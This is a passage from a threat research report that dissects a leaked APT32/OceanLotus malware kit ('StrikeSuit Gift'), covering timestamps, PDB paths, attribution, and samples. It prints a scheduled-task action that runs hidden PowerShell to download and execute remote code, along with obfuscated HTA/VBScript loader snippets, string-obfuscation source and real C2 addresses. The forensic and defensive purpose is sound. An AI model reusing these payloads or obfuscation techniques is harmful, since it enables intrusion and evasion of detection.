<RunLevel>LeastPrivilege</RunLevel>\n  </Principal>\n </Principals>\n <Settings>\n  <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\n  <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>\n  <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>\n  <AllowHardTerminate>true</AllowHardTerminate>\n  <StartWhenAvailable>false</StartWhenAvailable>\n  <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\n  <IdleSettings>\n    <StopOnIdleEnd>true</StopOnIdleEnd>\n    <RestartOnIdle>false</RestartOnIdle>\n  </IdleSettings>\n  <AllowStartOnDemand>true</AllowStartOnDemand>\n  <Enabled>true</Enabled>\n  <Hidden>false</Hidden>\n  <RunOnlyIfIdle>false</RunOnlyIfIdle>\n  <WakeToRun>false</WakeToRun>\n  <ExecutionTimeLimit>P3D</ExecutionTimeLimit>\n  <Priority>7</Priority>\n </Settings>\n <Actions Context=\"Author\">\n  <Exec>\n    <Command>rundll32.exe</Command>\n    <Arguments>mshta vbscript:Execute(\"CreateObject(\"WScript.Shell\").Run\"powershell.exe -nop -w\nhidden -c \"\"IEX ((new-object net.webclient).downloadstring('http://powershell.server'))\"\"\",\n0:code close\")</Arguments>\n  </Exec>\n </Actions>\n</Task>\n\n```\n\nThe XML for a Scheduled Task is not generated unless you export it, so we can guess that Windows is\nstoring the information used to create the XML somewhere in the registry. Using regedit.exe, we pull\nup HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\ to browse around\nTasks keys. We see that there is a registry key for our Time Test Task, where the DynamicInfo key\nstores what is likely to be our StartBoundary timestamp.\n\n###### 46\n\n\n-----\n\n[This value 1E7B9C6F3B2ED801 is a Windows FILETIME, a 64-bit structure containing the number of](https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-filetime?redirectedfrom=MSDN)\n[100-nanosecond intervals since Jan 1, 1601. Using CyberChef, we can convert 1E7B9C6F3B2ED801 to a](https://gchq.github.io/CyberChef/#recipe=Windows_Filetime_to_UNIX_Timestamp('Milliseconds%20(ms)','Hex%20(little%20endian)')Parse_DateTime('UNIX%20timestamp%20offset%20(milliseconds)','x','UTC')&input=MUU3QjlDNkYzQjJFRDgwMQ)\nmore human-readable format using the Windows FILETIME to UNIX Timestamp operation, which\nconfirms this hex value is 2022-03-02 at 13:43:01 UTC (or 8:43 AM EST). In Windows, w32tm.exe\ntakes 10^-7s (100 nanoseconds) intervals and converts to a readable format.\n\nThe value 1E7B9C6F3B2ED801 in Int64 is 132907021817903902. Passing that value into w32tm.exe\ngives us this:\n\n\n###### THREAT RESEARCH REPORT\n\n```\nC:\\Users\\user\\Desktop>w32tm.exe /ntte 132907021817903902\n153827 13:43:01.7903902 - 3/2/2022 1:43:01 PM\n\n```\n\nOf course, after doing all of that, we find out there is an easier way. We can pass the byte flipped hex of\nthe original value:\n\n```\nC:\\Users\\user\\Desktop>w32tm.exe /ntte 0x01D82E3B6F9C7B1E\n153827 13:43:01.7903902 - 3/2/2022 1:43:01 PM\n\n```\n\n###### 47\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nWell, we can see that w32tm.exe presents this timestamp to us just like we expected and with the\nexpected seven digits of precision. However, it is unclear how or why the last 7 digits differ from what\nwe see in our XML timestamp. Naturally, as with all things in digital forensics, you have to know what\nyour tools are doing behind the scenes to understand if they are summarizing or truncating numbers\nand to what degree of specificity, let alone the correct time offset. Timestamps, amirite?\n\n###### Developer fingerprints in scheduled task XML\n\nWhen we switch back to looking at XmlStr.txt, we see that this XML contains the original malware\ndeveloper’s computer name, user name, and timestamps that likely indicate the approximate date on\nthe development system when the XML script content was originally created, around the time it was\nused to create macros in the 2016 version of Macros_Builder.\n\n```\n<?xml version=\"1.0\" encoding=\"UTF-16\"?>\n<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\n<RegistrationInfo>\n  <Date>2016-06-02T11:13:39.1668838</Date>\n  <Author>WIN-FF211E5QDM2\\Rachael</Author>\n </RegistrationInfo>\n<Triggers>\n  <TimeTrigger>\n    <Repetition>\n     <Interval>PTBBBPOWERBBBM</Interval>\n     <StopAtDurationEnd>false</StopAtDurationEnd>\n</Repetition>\n    <StartBoundary>2016-06-02T11:12:49.4495965</StartBoundary>\n    <Enabled>true</Enabled>\n</TimeTrigger>\n </Triggers>\n\n```\n\nOne final nugget of interest is the interval value PTBBBPOWERBBBM. This is a value that was altered from\nthe original exported XML to be a placeholder value that would be changed depending on values\nentered in the GUI of the Macros_Builder program. Except this value is never referenced. Instead,\n```\nMacros_Builder Form1.cs checks the macro content to replace the value BBBPOWERBBB. This is one\n\n```\nof many small errors that shows that the program is obviously undergoing development at the time of\ninterception.\n\n###### 48\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nIf you’re a seasoned Windows forensicator, you’re likely already familiar with Windows timestamp\nshenanigans, and none of this is new or surprising to you. So why should you care and why does any of\nthis timestamp business matter? Well, seeing seven digits of precision in an XML scheduled task may\nindicate that it was created and exported by the Windows Task Scheduler. This structure of the\ntimestamp can be used for detection purposes to highlight content that was generated with this\napproach.\n\n###### Network-based indicators\n\nThe MacrosSource.txt file stored output from an execution of the newer debug build of\nMacros_Builder, leaving us these IP addresses that may have been used for the testing of the macro\ndownloader functionality.\n\n**Source file** **NBI**\n```\n MacrosSource.txt http[:]//86.105.18.241:80/images/pic1.jpg\n MacrosSource.txt http[:]//86.105.18.241:80/download/upload.php\n\n```\n[Fox IT spotted this IP address as a CobaltStrike server between 2016 and 2018, which roughly lines up](https://blog.fox-it.com/2019/02/26/identifying-cobalt-strike-team-servers-in-the-wild/)\nwith our early timeline for the Macros_Builder development.\n\n**Cobalt Strike IPv4** **Port** **First seen** **Last seen**\n```\n 86.105.18.241 80 2016-07-19 2018-10-08\n\n###### PDB paths\n\n```\nSeveral of the StrikeSuit Gift projects were compiled in debug mode, leaving us clear paths to the PDB\nsymbol files, reflecting information about the original development directories. Though we cannot\nnecessarily trust these timestamps to indicate the true original compile time, these paths and\ntimestamps together paint a fuzzy evolutionary timeline from old to new code and capabilities.\n\n###### 49\n\n|Source file|NBI|\n|---|---|\n|MacrosSource.txt|http[:]//86.105.18.241:80/images/pic1.jpg|\n|MacrosSource.txt|http[:]//86.105.18.241:80/download/upload.php|\n\n|Cobalt Strike IPv4|Port|First seen|Last seen|\n|---|---|---|---|\n|86.105.18.241|80|2016-07-19|2018-10-08|\n\n\n-----\n\n|hash.md5|pe.timestamp|pe.pdb_path|\n|---|---|---|\n|850b062d81975c43 8f2ab17f4a092c96|2008-09-01 18:48:30 (1220309310)|g:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShLdr\\\\obj\\\\Debug\\\\ShLd r.pdb|\n|80e2a8e2f51e22d9 6166cdb1f3d8a343|2009-05-16 07:47:06 (1242474426)|G:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShellcodeLoader\\\\Test\\\\ obj\\\\Release\\\\Test.pdb|\n|c71f9ef260213917 635609d16656e33d|2009-05-16 07:47:14 (1242474434)|G:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShellcodeLoader\\\\L\\\\obj \\\\Debug\\\\L.pdb|\n|e978b51735c75b04 7822ae6572538bbf|2009-05-16 07:47:14 (1242474434)|G:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\ShellcodeLoader\\\\Test\\\\ obj\\\\Debug\\\\Test.pdb|\n|06f47674da70f97b 6e2ff5ec11921ed7|2009-05-16 09:44:30 (1242481470)|g:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\HtaDotNet\\\\HtaDotnet\\\\o bj\\\\Debug\\\\HtaDotnet.pdb|\n|6bfdbd8a2b8adeb2 0681fa558498429d|2009-05-16 09:44:31 (1242481471)|g:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\HtaDotNet\\\\Test\\\\obj\\\\D ebug\\\\Test.pdb|\n|78473ef1282112dc 6dc5d03d4053372f|2009-05-16 09:44:40 (1242481480)|g:\\\\WebBuilder\\\\Gift_HtaDotNet\\\\HtaDotNet\\\\Test\\\\obj\\\\R elease\\\\Test.pdb|\n|ce985259ba7a962f 39c48f157e31f5aa|2013-10-08 12:00:51 (1381248051)|d:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\CSharp\\\\MacrosEmbedding\\\\MacrosEmbedding\\\\ob j\\\\Debug\\\\MacrosEmbedding.pdb|\n|1a54a5af55fa7210 f0f6e7b8118661ff|2013-10-08 12:08:52 (1381248532)|d:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\CSharp\\\\VbaCodeCreator\\\\VbaCodeCreator\\\\obj\\ \\Debug\\\\VbaCodeCreator.pdb|\n|d1c8da885b9f283c f2114e53fee43fe0|2016-01-26 04:18:22 (1453799902)|d:\\\\Source\\\\visual\\\\Embed Office\\\\NtfsStreams\\\\Trinet.Core.IO.Ntfs\\\\obj\\\\Debug\\\\T rinet.Core.IO.Ntfs.pdb|\n|feda9657a3861805 4fe95a07dad54598|2016-03-11 04:02:13|d:\\\\Source\\\\visual\\\\Embed Office\\\\Office Macros\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Release\\\\M|\n\n\n###### THREAT RESEARCH REPORT\n\n\n###### 50\n\n\n-----\n\n|Col1|(1457686933)|acros_Builder.pdb|\n|---|---|---|\n|4bfb1d2889d29936 c72513c9e187937e|2016-04-06 21:18:55 (1459991935)|d:\\\\Source\\\\visual\\\\VBScript ADS Loader\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Debug\\\\Mac ros_Builder.pdb|\n|c0ea1573b006ab4b 419af0e6b29df550|2016-07-20 00:32:49 (1468989169)|d:\\\\Source\\\\visual\\\\VBScript ADS Loader\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Debug\\\\Mac ros_Builder.pdb|\n|8d74fc0ef81b32f7 3c0797ec2a03e677|2017-08-14 00:31:58 (1502685118)|D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\CSharp\\\\MacrosEmbeddingExample\\\\MacrosEmbedd ingExample\\\\obj\\\\Debug\\\\MacrosEmbeddingExample.pdb|\n|e1a3d0eb585567a6 9eb2a0606b622e10|2017-08-17 00:03:09 (1502942589)|D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\VB\\\\XmlScriptAnalyst\\\\XmlScriptAnalyst\\\\obj\\ \\Debug\\\\XmlScriptAnalyst.pdb|\n|de1e7c29d98778fd 7fbb832bd599b367|2017-08-17 04:18:44 (1502957924)|d:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Reference\\\\Macros_Builder\\\\Macros_Builder\\\\obj\\\\Debu g\\\\Macros_Builder.pdb|\n|d4251964e97e7225 8be9cf1acf222bf3|2017-08-22 00:18:26 (1503375506)|d:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Reference\\\\WebBuilder\\\\ShellcodeLoader\\\\L\\\\obj\\\\Debu g\\\\L.pdb|\n|0f02cf16b466a7bd 2643ef01e09fc6d0|2017-08-22 00:18:30 (1503375510)|d:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Reference\\\\WebBuilder\\\\ShellcodeLoader\\\\Test\\\\obj\\\\D ebug\\\\Test.pdb|\n|84113138ed90ab30 3a4dd1eedc6a6f19|2017-08-23 04:44:28 (1503477868)|D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\C_Cpp\\\\Binary\\\\Debug\\\\Binary.pdb|\n|e2a9f698cb6aa417 bae41ce02d0555da|2017-08-23 07:01:51 (1503486111)|D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\C_Cpp\\\\ShellcodeThreadCaller\\\\x64\\\\Debug\\\\Sh ellcodeThreadCaller.pdb|\n|77374f452700e17f 3fe8c959db3d9f23|2017-08-23 07:02:11 (1503486131)|D:\\\\P17028 - StrikeSuit Gift - Office Macro Type 1\\\\Source\\\\C_Cpp\\\\ShellcodeThreadCaller\\\\Debug\\\\Shellco deThreadCaller.pdb|\n\n\n###### THREAT RESEARCH REPORT\n\n\n###### 51\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\n#### Threadwork of attribution and assessing connections to APT32\n\nFinally, after tedious inspection of this messy pile of data, we can take stock of our indicators, TTPs,\nand other pivots and align the StrikeSuit Gift package with public reporting of named threat actors.\n\nAttribution is a spectrum, of course, and along the axis of specificity there are different burdens of\nproof required to make an attribution. In our case, because we are assessing alignment with a large\ncluster that is not necessarily a real-life “group” but more a superset of intrusions that transcend years\nof activity, a preponderance of evidence will suffice. So, let’s begin with dumping a few of the most\nqualified data points that show connections to APT32 or OceanLotus.\n\n###### ShellcodeLoader L.dll\n\nForemost, the L.dll shellcode loader (b28c80ca9a3b7deb09b275af1076eb55) in the source\npackage is the same hash as that which is mentioned in this [RedDrip Team blog about OceanLotus.](https://ti.qianxin.com/blog/articles/english-version-of-new-approaches-utilized-by-oceanLotus-to-target-vietnamese-environmentalist/)\nBeyond being simply the same hash, the StrikeSuit Gift project WebBuilder/ShellcodeLoader has all\nthe technical hallmarks of being the source code for this loader, so that’s nice and convenient for us.\n```\nShellcodeLoader project showing TypeLib Id GUID, which is the same as in the L.dll file\nb28c80ca9a3b7deb09b275af1076eb55\n\n###### 52\n\n```\n\n-----\n\n###### XML timestamps\n\nThere are more direct and obvious connections to APT32 (or OceanLotus) in the VB macro and XML\nscheduled tasks. A quick survey shows that the two XML timestamps observed across multiple projects\nin the StrikeSuit Gift package (StartBoundary 2016-06-02T11:12:49.4495965 and Date\n```\n2016-06-02T11:13:39.1668838) are seen in the macro content of hundreds of malicious documents.\n\n###### 53\n\n```\n\n###### THREAT RESEARCH REPORT\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nMany of these macros designate remote network resources attributed to APT32, OceanLotus, Cobalt\nKitty, and so forth.\n\nSample files containing StartBoundary and Date timestamps 2016-06-02T11:12:49.4495965 and\n```\n2016-06-02T11:13:39.1668838, revealing many overlaps with APT32 and OceanLotus infrastructure.\n\n```\n**File MD5** **Example C2 address from macro** **C2 attribution**\n\n`33adc53121634127` `http[:]//23.227.196.210:80/upload/private/` APT32 (Mandiant)\n```\n bd242ebaf98d1da8 picr.jpg\n\n```\n`e334b21a2c52dcf8` `http[:]//80.255.3.87:80/a/g/10007.jpg` APT32 (Mandiant)\n```\n 6ea8c0785044d578\n\n```\n`2926a94b1cc86738` `http[:]//185.157.79.3:80/update` APT32 (Mandiant)\n```\n 422434c7448dee25\n\n```\n`387e5e61a4218977` `http[:]//contay.deaftone.com/user/upload/i` APT32 (Mandiant)\n```\n a46990b47dfb4726 mg/icon.gif?n=%COMPUTERNAME%\n\n```\n`e47554108ef02e9c` `http[:]//job.supperpow.com:80/pd/random1/r` APT32 (Mandiant)\n```\n dc3a034fea1cb943 andpic/1.jpg\n\n```\n`f87bab14791c3230` `\\\"h\\\"t\\\"t\\\"p://icon.torrentart.com:80/789.` APT32 (Mandiant)\n```\n b43241500870b109 jpg\n\n```\n`b7ee7947f9f01790` `http[:]//104.237.218.70:80/a` APT32 (Mandiant)\n```\n 69e6271c4cd58c05\n\n```\n`919de0e7bd8aaed8` `http[:]//gap-facebook.com/microsoft` APT32 (Mandiant)\n```\n 46a8d9378446320f\n\n```\n`fa6d09f010f11351` `http[:]//lawph.info/download/user.ico` Unknown\n```\n a92c409fef7ba263\n\n```\n`5475d81ce3b3e018` `http[:]//msofficecloud.org/roffice` OceanLotus (blevene)\n```\n c33fbc83bdc0aa68\n\n```\n`207375c4bd19fd4f` `http[:]//193.169.245.137:80/g4.ico` APT32 (Mandiant)\n\n###### 54\n\n|File MD5|Example C2 address from macro|C2 attribution|\n|---|---|---|\n|33adc53121634127 bd242ebaf98d1da8|http[:]//23.227.196.210:80/upload/private/ picr.jpg|APT32 (Mandiant)|\n|e334b21a2c52dcf8 6ea8c0785044d578|http[:]//80.255.3.87:80/a/g/10007.jpg|APT32 (Mandiant)|\n|2926a94b1cc86738 422434c7448dee25|http[:]//185.157.79.3:80/update|APT32 (Mandiant)|\n|387e5e61a4218977 a46990b47dfb4726|http[:]//contay.deaftone.com/user/upload/i mg/icon.gif?n=%COMPUTERNAME%|APT32 (Mandiant)|\n|e47554108ef02e9c dc3a034fea1cb943|http[:]//job.supperpow.com:80/pd/random1/r andpic/1.jpg|APT32 (Mandiant)|\n|f87bab14791c3230 b43241500870b109|\\\"h\\\"t\\\"t\\\"p://icon.torrentart.com:80/789. jpg|APT32 (Mandiant)|\n|b7ee7947f9f01790 69e6271c4cd58c05|http[:]//104.237.218.70:80/a|APT32 (Mandiant)|\n|919de0e7bd8aaed8 46a8d9378446320f|http[:]//gap-facebook.com/microsoft|APT32 (Mandiant)|\n|fa6d09f010f11351 a92c409fef7ba263|http[:]//lawph.info/download/user.ico|Unknown|\n|5475d81ce3b3e018 c33fbc83bdc0aa68|http[:]//msofficecloud.org/roffice|OceanLotus (blevene)|\n|207375c4bd19fd4f|http[:]//193.169.245.137:80/g4.ico|APT32 (Mandiant)|\n\n\n-----\n\n|a0e5352269bfb88e|Col2|Col3|\n|---|---|---|\n|ba844b09524aea07 7f6a175da10a6bf0|http[:]//chinanetworkvub.info:80/global/as ian.jpg|Unknown|\n|f46f2252ee955ca5 f89429fc5519150f|http[:]//update-flashs.com/gpixel.jpg|APT32 (Mandiant)|\n|d4ec27868e8530ca 15daa274ec269bbe|http[:]//google-script.com/adobereg.bin|Cobalt Kitty (CyberReason)|\n|e48cc615a4569175 b2ea144928d5b871|http[:]//support.chatconnecting.com:80/pub lic/public_pics/rpic.jpg|OceanLotus (blevene) Cobalt Kitty (CyberReason)|\n\n\n###### THREAT RESEARCH REPORT\n\n\n###### ObfuscationHelper.cs\n\nTaking a step beyond the comfortable immediacy of indicator links, we can take a gander at TTPs\nassociated with StrikeSuit Gift and APT32 such as obfuscation methods.\n\nOne of the interesting components of the StrikeSuit Gift package is a piece of source code smartly\nnamed ObfuscationHelper. Within the HtaDotnet package, the ObfuscationHelper.cs code\ndoes exactly what it sounds like it does, and has a bunch of functions to help provide jacked up strings\nwhen building HTA files with obfuscated macros. There are many layers to this onion. The\n```\nObfuscationHelper, though, uses arrays of vowels and consonants to build random strings with\n\n```\nrandom casings that appear to be like words.\n\nFor example, we can use the HtaDotnet project to build an HTA file and we might get code that looks\nsomething like this:\n\nSnippets of code extracted from a fabricated test HtaDotnet output .hta file.\n\n```\n<HTA:APPLICATION iD=\"KONG\" iCON=\"#\" wINDOwstATE='mINiMize' sHOwINtAskbAR='No' />\n<script language=\"vbscript\">\non ERror reSume Next\nHetGhonCosWewShiw=\"ZXUWgQaHQl0qUbK9YHZROhNYn0jYAAEAAAD.....AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdG\nVTZXJpYWxpemF0aW9uSG9sZGVyBAAAAAhEZWxlZ2F0ZQd0YXJnZ\"\n\n```\n\n###### 55\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\nJepZacWimQuungGhun=\"h6m1P3lqH0iwiS0xNaK,wUxEnHR2umtUEJmSvy,fHWQKsadnNWMoLi,4T83Ud8uQOLnzcSqqWAmta\n9p5DAABAAAA.....wEAAAAAAAAABAEAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdG\nUHdGFyZ2V0MAdtZXRob2\"\n… (truncated)\nFunctIoN  QuudKisWhaw  ( WhacThes)\nQuisVesGupYewFong = WhacThes\nQuisVesGupYewFong =ReplAce  ( QuisVesGupYewFong,\" \" , \"=\")\n QuisVesGupYewFong= replACE( QuisVesGupYewFong,\".\", \"/\")\n QuisVesGupYewFong =  replAce  (  QuisVesGupYewFong,\",\", \"+\"  )\nQuudKisWhaw= QuisVesGupYewFong\n  ENd FunCtIOn\n…(truncated)\n fuNCtIOn WhosChem (  YowDon, GongWiwFangLip,GidRomShos ,CiwHap, KepChinGhop\n,GinChongYiwQuis)\n oN eRroR reSume NExT\n Set ShepWhud = COpquiwwHEnleT ( \"WScript.Shell\"  )\n ShepWhud.RegRead \"HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\\"+  YowDon+  \"\\\"\n…\n\n```\n\nAn analyst looking at just the HTA file might be quick to hone in on a couple of unique values such as\n```\n<HTA:APPLICATION iD=\"KONG\", but we can see in our source code that the value KONG is actually\n\n```\ngenerated by the ObfuscationHelper.\n\nCode to create the randomized HTA header using ObfuscationHelper\n\n```\nhtaAttr = ObfuscationHelper.RandomLowerUpperCase(\"ID=\\\"\" + obs.RandomWords() + \"\\\" icon=\\\"#\\\"\n/>\");\n\n```\n\nThe special sauce of ObfuscationHelper begins with three string arrays for vowels and consonants\nthat are later used to build words, which are later checked against a list of special, reserved keywords\nfor the VB macro. We notice that in CONSONANTS_1 there are a couple of duplicates, perhaps a\ncopy/paste error. The vowels will be familiar to most, but how and why are these consonants selected?\n\n###### 56\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nOn speculation, we may guess that these consonants (and digraph phonemes, representing small\npieces of sound in speech) were selected to help fabricate fake strings that appear to be read like or\nsound like real language words. The selection of vowels and consonants allows the generation of\nstrings with the right construction, though that is highly dependent on the language. For example, when\nconsidered phonetically, modern English commonly uses the phoneme ð (digraph “th”), whereas the\nphoneme ɣ (digraph “gh”) is not present. So what does this exact array of consonants imply, and did\nthe developer premeditate the consonants to appear like a particular language? If so, which one? Would\nVietnamese be a baseless guess? Or maybe it's random copypasta? Maybe we will never know.\n```\nObfuscationHelper declaring the string arrays\n\n```\n```\nprivate static readonly string[] VOWELS = new string[] { \"a\", \"e\", \"i\", \"o\", \"u\" };\nprivate static readonly string[] CONSONANTS_1 = new string[] { \"b\", \"c\", \"d\", \"f\", \"g\", \"h\", \"j\",\n\"k\", \"l\", \"ch\", \"gh\", \"qu\", \"sh\", \"th\", \"wh\", \"m\", \"n\", \"p\", \"q\", \"r\", \"s\", \"t\", \"v\", \"w\", \"x\",\n\"y\", \"z\", \"ch\", \"gh\", \"qu\", \"sh\", \"th\", \"wh\" };\nprivate static readonly string[] CONSONANTS_2 = new string[] { \"c\", \"d\", \"m\", \"n\", \"p\", \"ng\",\n\"s\", \"t\", \"w\", \"ng\" };\n\n```\n\nCloning new arrays for ObfuscationHelper()\n\n```\npublic ObfuscationHelper()\n{\n  this.m_vowels = CloneStringArray(VOWELS);\n  this.m_consonants_1 = CloneStringArray(CONSONANTS_1);\n  this.m_consonants_2 = CloneStringArray(CONSONANTS_2);\n}\n\n```\n\nExample of a function using the consonant and vowel arrays to build a randomized word.\n\n```\npublic string RandomSingleWord(bool autoUpper)\n{\n  URandom rand = new URandom();\n  int idx1 = rand.Next(0, this.m_consonants_1.Length);\n  int idx2 = rand.Next(0, this.m_vowels.Length);\n  int idx3 = rand.Next(0, this.m_consonants_2.Length);\n  string s = this.m_consonants_1[idx1];\n  if (autoUpper)\n  {\n\n```\n\n###### 57\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\n     string u = s.Substring(0, 1).ToUpper();\n     s = u + s.Substring(1);\n  }\n  s += this.m_vowels[idx2];\n  s += this.m_consonants_2[idx3];\n  return s;\n}\n\n```\n\nThe reason this ObfuscationHelper is pertinent to the discussion is that APT32/OceanLotus clusters\nare famous for similar obfuscation and encoding, and they are likely using similar techniques still today.\n\nIn 2018, ESET detailed a piece of malware with a library HTTPprov designed to aid in string generation\nfor its URI callbacks (190db4e6de3a96955502f3e450428217).\n\nExcerpt from ESET OceanLotus old techniques, new backdoor\n\n```\nbuffEnd = ((DWORD)genRand(4) % 20) + 10 + buff;\nwhile (buff < buffEnd){\n  b=genRand(16);\n  if (b[0] - 0x50 > 0x50)\n     t=0;\n  else\n     *buf++= UPPER(vowels[b[1] % 5]);\n  v=consonants[b[1]%21]);\n  if (!t)\n     v=UPPER(v);\n  *buff++= v;\n  if (v!=’h’ && b[2] - 0x50 < 0x50)\n     *buff++= ‘h’; *buff++= vowels[b[4] % 5];\n  if (b[5] < 0x60)\n     *buff++= vowels[b[6] % 5]; *buff++= consonants[b[7] % 21];\n  if (b[8] < 0x50)\n     *buff++= vowels[b[9] % 5]; *buff++= ‘-’;\n}; *buff=’\\0’;\n\n```\n\nIn the [2019 OceanLotus report by RedDrip Team, we see this HTA file](https://ti.qianxin.com/blog/articles/english-version-of-new-approaches-utilized-by-oceanLotus-to-target-vietnamese-environmentalist/)\n(042f06b110a0a53a7e30b0e0490ea317) which drops, amongst many other things, the shellcode for\na backdoor (a8ff3e6abe26c4ce72267154ca604ce3). The HTA file from the wild has all the look and\nfeel as our HTA test file generated with Obfuscation Helper. This is not surprising, because our\n\n###### 58\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\nShellcodeLoader shows along with this attack as well, but it’s still nice to see all of these tools\n\n```\nplaying together nicely in the field.\n\nSnippets of code from 2019 OceanLotus HTA file 042f06b110a0a53a7e30b0e0490ea317\n\n```\n<HTA:APPLICATION Id=\"FEtWePQUUdmonyaNg\" icoN=\"#\" WINDOWsTATe='mINimIZE' shOWINtasKBar='No' />\n<script language=\"vbscript\">\non erROR RESUMe NexT\nQuus  =\n\"3F6OPnBc4gv4d10Fv34AulSxgpUAAQAAAP....8BAAAAAAAAAAQBAAAAIlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25I\nb2xkZXIEAAAACERlbGVnYXRlB3RhcmdldDAHbWV0aG9kMAdtZXRob2QxAwcDAzBTeXN0\"\n…\n FUNctIon  QuangGhut  ( BongHim )\n set QuangGhut= CreAteobjECT (BongHim )\n enD FUnCtIon\n…\n FuNCtiOn  NingGhac(ThepGhotChudVong,HengThew ,ChedBom ,PitWhiwVeng )\n  SeT DapVen = qUAnggHUt  ( \"System.Text.ASCIIEncoding\")\n sEt MicSotThasGaw = quAnGghuT  ( \"System.Security.Cryptography.FromBase64Transform\")\n SEt QuengZiwGhat = QUANGgHUt  ( \"System.IO.MemoryStream\")\n QuengZiwGhat.Write MicSotThasGaw.TransformFinalBlock (  DapVen.GetBytes_4 (ThepGhotChudVong)\n, 0 ,  HengThew) ,  0, ChedBom\n  QuengZiwGhat.Position = PitWhiwVeng\n SeT NingGhac = QuengZiwGhat\n eND fUNCtIon\n\n```\n\nWhen we execute that HTA in a virtual machine, out pops a backdoor, fresh as a newborn fawn. The\nbackdoor makes HTTP POST requests with URIs that appear to contain fake, randomized words likely\nusing some variation of the custom HTTPprov library previously described by ESET.\n```\nHTTP POST requests with randomized word URIs from the backdoor in 2019 OceanLotus HTA file\n042f06b110a0a53a7e30b0e0490ea317\n\n###### 59\n\n```\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nA [2019 blog by NSFOCUS](http://blog.nsfocus.net/apt32-organization-denesrat-trojan-related-attack-chain-analysis/) examines this exact backdoor and demonstrates the URI generation\nalgorithm generating the vowels and consonants array as aAeiou and aBcdyzfghjklpwr, respectively.\nThis technique by HTTPprov is clearly different from the approach in the ObfuscationHelper project,\nyet these methods show the developers behind APT32 (and OceanLotus) malware kits wish to provide\nflexible functionalities that create fake, randomized strings that look almost (but not quite) like real\nwords. This is an important piece of tradecraft because it is something we can study and track as the\ndevelopers evolve the toolset.\n\n###### 60\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n\nNSFOCUS depictions of the URI generation algorithm\n\n###### APT32 then and now\n\nThe StrikeSuit Gift package of malware is undoubtedly linked to APT32 based on the\n```\nShellcodeLoader and the XML timestamps that draw concrete connections to attributed APT32,\n\n```\nOceanLotus, Cobalt Kitty, and other monikers for this rampant threat actor.\n\nLooking at the obfuscation and randomization tradecraft from StrikeSuit Gift’s ObfuscationHelper,\nwe can see similarities in other OceanLotus projects such as the HTTPprov library that helps generate\nfake URIs for backdoor C2 schemas.\n\n###### 61\n\n\n-----\n\nAPT32 has certainly not been sleeping since 2017. Time marches on and a lot has changed. But what\nhas stayed the same? Instead of looking at the actor’s evolution forward in time, we can take stock of\nthe attacks we see in 2022 and connect the dots back to the puzzle pieces of the past.\n\n[Netskope Threat Labs detailed a 2022 APT32 operation using MHT lure files](https://www.netskope.com/blog/abusing-microsoft-office-using-malicious-web-archive-files) and C2 via the legitimate\nweb service Glitch.me. The initial lure documents were shipped in a RAR file. Taking a peek at one of\nthese RARs, we can see the last modified time has modernized to the eight-byte Windows FILETIME, so\nwe know the actor is using WinRAR 5+ with defaults for high-precision timestamps, just like the rest of\nus.\n\nInside of an example RAR file for this campaign, we find an MHT file with a .doc extension, and we see\nthat the document has an Alternate Data Stream ZoneId of 2. It's no coincidence that this is the same\napproach taken in StrikeSuit Gift’s Macros_Builder.\n\nUsing PowerShell to tease out the ADS Zone Identifier for 2022 MHT\n```\n92f5f40db8df7cbb1c7c332087619afa\n\n```\n\n###### THREAT RESEARCH REPORT\n\n```\nPS C:\\Users\\user\\Desktop> Get-Item -path C:\\Users\\user\\Desktop\\HS.doc -stream Zone.Identifier\n…\nFileName   : C:\\Users\\user\\Desktop\\HS.doc\nStream    : Zone.Identifier\nLength    : 24\n PS C:\\Users\\user\\Desktop> Get-Content C:\\Users\\user\\Desktop\\HS.doc -stream Zone.Identifier\n[ZoneTransfer]\nZoneId=2\n\n```\n\nRoutine from 2017 Macros_Builder\\Form1.cs to add ADS Zone Identifier for input files\n\n```\nprivate void buttonCreate_Click(object sender, EventArgs e)\n{\n  if (textBoxADS.Text.Trim().Length <= 0)\n\n```\n\n###### 62\n\n\n-----\n\n###### THREAT RESEARCH REPORT\n\n```\n       {\n         MessageBox.Show(\"Missing path!\");\n         return;\n       }\n       string StreamName = 